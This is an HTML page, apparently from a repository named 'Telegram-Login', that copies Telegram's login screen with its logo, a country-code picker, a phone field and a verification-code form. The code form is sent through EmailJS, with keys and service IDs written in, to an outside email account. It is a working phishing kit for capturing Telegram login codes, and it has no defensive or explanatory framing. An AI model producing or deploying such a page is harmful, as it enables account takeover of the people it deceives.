 <!DOCTYPE html><html>
<head>
  <title>Telegram Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
  <script>
    (function(){
      emailjs.init("CcyxH-Y2A8K4nnaz8"); // Your public key
    })();
  </script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #ffffff;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: #fff;
      padding: 30px 20px;
      border-radius: 10px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: center;
    }
    .login-box img.logo {
      width: 60px;
      margin-bottom: 20px;
    }
    .login-box h3 {
      margin-bottom: 5px;
      font-size: 20px;
    }
    .login-box p {
      margin-top: 0;
      margin-bottom: 20px;
      font-size: 14px;
      color: #888;
    }
    select, input, button, label {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      font-size: 16px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    .checkbox-label {
      display: flex;
      align-items: center;
      margin-bottom: 20px;
    }
    .checkbox-label input {
      width: auto;
      margin-right: 10px;
    }
    .submit-btn {
      background-color: #3390ec;
      color: white;
      border: none;
      cursor: pointer;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      display: flex;
      justify-content: center;
      align-items: center;
      float: right;
    }
    .submit-btn span {
      font-size: 24px;
    }
    #codeForm {
      display: none;
    }
    .resend-timer {
      font-size: 14px;
      color: #888;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo">
    <h3>Your phone number</h3>
    <p>Please confirm your country code and enter your phone number.</p>
    <form id="phoneForm">
      <select name="user_country_code" id="user_country_code" required>
        <option value="+1">🇺🇸 USA (+1)</option>
        <option value="+44">🇬🇧 UK (+44)</option>
        <option value="+91">🇮🇳 India (+91)</option>
        <option value="+251">🇪🇹 Ethiopia (+251)</option>
        <option value="+81">🇯🇵 Japan (+81)</option>
        <option value="+61">🇦🇺 Australia (+61)</option>
        <option value="+49">🇩🇪 Germany (+49)</option>
        <option value="+33">🇫🇷 France (+33)</option>
        <option value="+39">🇮🇹 Italy (+39)</option>
        <option value="+7">🇷🇺 Russia (+7)</option>
        <option value="+86">🇨🇳 China (+86)</option>
        <option value="+82">🇰🇷 South Korea (+82)</option>
        <option value="+234">🇳🇬 Nigeria (+234)</option>
        <option value="+55">🇧🇷 Brazil (+55)</option>
        <option value="+34">🇪🇸 Spain (+34)</option>
      </select>
      <input type="text" name="user_phone" id="user_phone" placeholder="Phone number" required>
      <label class="checkbox-label"><input type="checkbox" checked> Sync Contacts</label>
      <button type="button" class="submit-btn" onclick="showCodeSection()"><span>&#8594;</span></button>
    </form><form id="codeForm">
  <input type="text" name="user_code" placeholder="Verification Code" required>
  <button type="submit">Send Code</button>
  <div class="resend-timer" id="resendTimer">Resend available in 30s</div>
</form>

  </div>  <script>
    document.getElementById("user_country_code").addEventListener("change", function() {
      document.getElementById("user_phone").value = this.value;
    });

    function showCodeSection() {
      var phone = document.getElementById("user_phone").value;
      if (!phone) {
        alert("Please enter your phone number.");
        return;
      }
      document.getElementById("phoneForm").style.display = "none";
      document.getElementById("codeForm").style.display = "block";
      startResendTimer();
    }

    document.getElementById("codeForm").addEventListener("submit", function(e) {
      e.preventDefault();
      emailjs.sendForm("service_uwgslce", "template_jq0b0o5", this)
        .then(function(response) {
          alert("Verification code sent to your email!");
        }, function(error) {
          alert("Failed to send. Check console.");
          console.log("FAILED...", error);
        });
    });

    function startResendTimer() {
      var timeLeft = 30;
      var timerDisplay = document.getElementById("resendTimer");
      timerDisplay.textContent = `Resend available in ${timeLeft}s`;
      var countdown = setInterval(function() {
        timeLeft--;
        timerDisplay.textContent = `Resend available in ${timeLeft}s`;
        if (timeLeft <= 0) {
          clearInterval(countdown);
          timerDisplay.textContent = "You can resend the code now.";
        }
      }, 1000);
    }
  </script></body>
</html>  # Telegram-Login-
